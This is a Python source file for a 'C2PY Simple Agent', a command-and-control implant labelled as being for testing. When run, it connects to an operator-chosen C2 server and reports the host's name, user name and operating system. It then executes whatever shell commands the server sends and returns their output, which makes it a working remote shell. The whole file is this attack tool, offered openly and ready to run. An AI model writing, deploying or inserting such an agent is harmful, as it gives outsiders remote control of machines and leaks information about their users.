#!/usr/bin/env python3
"""
C2PY Simple Agent - For Testing Purposes
"""

import socket
import subprocess
import os
import time
import threading

class SimpleAgent:
    def __init__(self, host="127.0.0.1", port=9999):
        self.host = host
        self.port = port
        self.sock = None
        self.running = False
        
    def connect(self):
        """Connect to C2 server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def send_system_info(self):
        """Send initial system information"""
        try:
            # Send hostname
            hostname = os.environ.get('COMPUTERNAME', 'Unknown')
            self.sock.send(f"HOSTNAME:{hostname}\n".encode())
            
            # Send username
            username = os.environ.get('USERNAME', 'Unknown')
            self.sock.send(f"USERNAME:{username}\n".encode())
            
            # Send OS info
            import platform
            os_info = platform.system() + " " + platform.release()
            self.sock.send(f"OS:{os_info}\n".encode())
            
            print("[+] System info sent")
        except Exception as e:
            print(f"[-] Failed to send system info: {e}")
    
    def execute_command(self, command):
        """Execute command and return result"""
        try:
            if command.strip().lower() == 'exit':
                self.running = False
                return "Agent disconnecting..."
            
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding="utf-8",
                errors="ignore"
            )
            output = result.stdout
            if result.stderr:
                output += f"\nError: {result.stderr}"
            return output if output else "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def run(self):
        """Main agent loop"""
        if not self.connect():
            return
        
        self.send_system_info()
        self.running = True
        
        print("[+] Agent running... (Ctrl+C to exit)")
        
        try:
            while self.running:
                try:
                    # Receive command
                    self.sock.settimeout(1.0)
                    data = self.sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    
                    if not data:
                        continue
                    
                    print(f"[>] Received command: {data}")
                    
                    # Execute command
                    response = self.execute_command(data)
                    
                    # Send response
                    self.sock.send((response + "\n").encode())
                    print(f"[<] Sent response ({len(response)} chars)")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Error in main loop: {e}")
                    break
                    
        except KeyboardInterrupt:
            print("\n[!] Agent interrupted by user")
        finally:
            if self.sock:
                self.sock.close()
            print("[+] Agent disconnected")

def main():
    print("C2PY Simple Agent v1.0")
    print("=" * 30)
    
    # Default connection settings
    host = input("C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
    port = input("C2 Server Port [9999]: ").strip() or "9999"
    
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number")
        return
    
    agent = SimpleAgent(host, port)
    agent.run()

if __name__ == "__main__":
    main()
